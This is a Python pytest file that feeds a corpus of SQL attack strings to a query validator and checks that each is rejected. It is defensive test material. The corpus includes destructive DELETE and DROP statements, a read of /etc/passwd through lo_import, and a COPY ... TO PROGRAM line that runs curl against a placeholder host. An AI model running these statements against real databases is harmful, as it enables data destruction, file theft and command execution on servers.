"""SQL attack corpus (spec section 30, A03).

Every declared forbidden class must be rejected by the validator. These tests
run without services; the database-level half of A03/A05 lives in
tests/integration/test_source_permissions.py.
"""

from __future__ import annotations

import pytest

from tests.unit.test_validator import expect_error, validate


ATTACKS = [
    # (sql, expected error code, description)
    ("SELECT 1; DELETE FROM fixture_metrics", "SQL_FORBIDDEN", "multi statement"),
    (
        "WITH gone AS (DELETE FROM fixture_metrics RETURNING dt) SELECT * FROM gone",
        "SQL_FORBIDDEN",
        "write CTE",
    ),
    ("SELECT * INTO backup_table FROM fixture_metrics", "SQL_FORBIDDEN", "SELECT INTO"),
    ("SELECT /*!50000 SLEEP(5) */ dt FROM fixture_metrics", "SQL_FORBIDDEN", "executable comment"),
    ("SELECT my_udf(dt) FROM fixture_metrics", "SQL_FORBIDDEN", "user function"),
    (
        "WITH RECURSIVE walk AS (SELECT 1 AS n UNION ALL SELECT n + 1 FROM walk) SELECT * FROM walk",
        "SQL_FORBIDDEN",
        "recursive CTE",
    ),
    (
        "WITH x AS (SELECT * FROM pg_catalog.pg_tables) SELECT * FROM x",
        "DATASET_NOT_REGISTERED",
        "unauthorized system subquery",
    ),
    ("SELECT * FROM pg_catalog.pg_tables", "DATASET_NOT_REGISTERED", "system table"),
    ("SELECT * FROM information_schema.columns", "DATASET_NOT_REGISTERED", "information schema"),
    ("SELECT * FROM other.public.fixture_metrics", "DATASET_NOT_REGISTERED", "external catalog"),
    ("SELECT dblink('host=x', 'select 1') FROM fixture_metrics", "SQL_FORBIDDEN", "dblink"),
    ("SELECT * FROM fixture_metrics FOR UPDATE", "SQL_FORBIDDEN", "locking read"),
    ("SET statement_timeout = 0; SELECT 1", "SQL_FORBIDDEN", "session command"),
    ("SHOW search_path", "SQL_FORBIDDEN", "show command"),
    (
        "SELECT dt FROM fixture_metrics m CROSS JOIN fixture_extra e",
        "SQL_FORBIDDEN",
        "cross join",
    ),
    ("SELECT pg_sleep(10) FROM fixture_metrics", "SQL_FORBIDDEN", "sleep function"),
    ("SELECT lo_import('/etc/passwd') FROM fixture_metrics", "SQL_FORBIDDEN", "file function"),
    (
        "COPY (SELECT * FROM fixture_metrics) TO PROGRAM 'curl http://evil'",
        "SQL_FORBIDDEN",
        "COPY PROGRAM",
    ),
    ("SELECT version() FROM fixture_metrics", "SQL_FORBIDDEN", "unknown function default deny"),
    ("SELECT current_setting('data_directory') FROM fixture_metrics", "SQL_FORBIDDEN", "setting read"),
    ("UPDATE fixture_metrics SET note = 'x'", "SQL_FORBIDDEN", "update statement"),
    ("CREATE VIEW v AS SELECT 1", "SQL_FORBIDDEN", "DDL"),
    ("DROP TABLE fixture_metrics", "SQL_FORBIDDEN", "drop"),
    (
        "WITH c AS (SELECT * FROM fixture_metrics) SELECT * FROM c, fixture_extra e",
        "SQL_FORBIDDEN",
        "comma join with CTE",
    ),
    (
        'SELECT * FROM "Fixture_Metrics"',
        "DATASET_NOT_REGISTERED",
        "case-sensitive quoted identifier",
    ),
]


@pytest.mark.parametrize("sql,code,description", ATTACKS, ids=[a[2] for a in ATTACKS])
def test_attack_is_rejected(sql, code, description):
    expect_error(sql, code)


def test_safe_query_still_passes_after_corpus():
    validate("SELECT dt, SUM(revenue_usd) FROM fixture_metrics GROUP BY dt")
